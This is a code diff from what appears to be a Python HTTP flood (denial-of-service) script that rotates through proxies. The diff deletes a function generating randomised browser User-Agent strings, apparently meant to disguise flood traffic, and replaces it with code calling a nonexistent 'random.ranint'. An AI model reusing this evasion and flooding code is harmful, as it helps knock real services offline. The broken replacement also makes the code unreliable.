@@ -79,30 +79,8 @@ clone_socks()
 
 
 def GenUA():
-    AW = str(random.randint(500,599))+".36"
-    BV = str(random.randint(24,80))+".0."+str(random.randint(3000,4000))+"."+str(random.randint(1,200))
-    OPR = str(random.randint(30,70))+".0."+str(random.randint(1000,4000))+"."+str(random.randint(1,1000))
-    UCB = str(random.randint(5,12))+"."+str(random.randint(5,12))+"."+str(random.randint(0,10))+"."+str(random.randint(1,1000))
-    devices = random.choice(["IOS","Windows","X11","Android","Symbian","Macintosh"])
-    if devices =="Windows":
-        version = random.choice(["Windows NT 10.0; Win64; X64","Windows NT 10.0; WOW64","Windows NT 5.1; rv:7.0.1","Windows NT 6.1; WOW64; rv:54.0","Windows NT 6.3; Win64; x64","Windows NT 6.3; WOW64; rv:13.37"])
-    elif devices =="IOS":
-        version = random.choice(["iPhone; CPU iPhone OS 13_3 like Mac OS X","iPad; CPU OS 13_3 like Mac OS X","iPod touch; iPhone OS 4.3.3","iPod touch; CPU iPhone OS 12_0 like Mac OS X"])
-    elif devices =="X11":
-        version = random.choice(["X11; Linux x86_64","X11; Ubuntu; Linux i686","SMART-TV; Linux; Tizen 2.4.0","X11; Ubuntu; Linux x86_64","X11; U; Linux amd64","X11; GNU/LINUX","X11; CrOS x86_64 11337.33.7"])
-    elif devices =="Android":
-        version = random.choice(["Linux; Android 4.2.1; Nexus 5 Build/JOP40D","Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad","Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H","Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T","Linux; Android 5.1.1; vivo X7 Build/LMY47V","Linux; Android 6.0; Nexus 5 Build/MRA58N","Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2","Linux; Android 8.0.0; SM-N9500 Build/R16NW","Linux; Android 9.0; SAMSUNG SM-G950U"])
-    elif devices =="Macintosh":
-        version = random.choice(["Macintosh; Intel Mac OS X 10_14_4", "Macintosh; U; Intel Mac OS X 12_10_0"])
-    elif devices =="Symbian":
-        version = random.choice(["Series40; Nokia200/11.56; Profile/MITP-2.1 Configuration/CLDC-1.1","SymbianOS/9.1; U; en-us","Series30Plus; Nokia220/10.03.11; Profile/Series30Plus Configuration/Series30Plus"])
-    borwser = random.choice(["chrome","uc","op"])
-    if borwser =="chrome":
-        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Chrome/"+ BV + " Safari/"+ AW
-    elif borwser =="op":
-        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Chrome/"+ BV + " Safari/"+ AW +" OPR/" + OPR
-    elif borwser =="uc":
-        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Version/4.0 Chrome/"+ BV + " UCBrowser/" + UCB + " Safari/"+ AW
+    strNumber = random.ranint(0, 5000)
+    return str(strNumber)
 
 def flood(attack_type,host,port,path,x):
     if x < len(proxies):
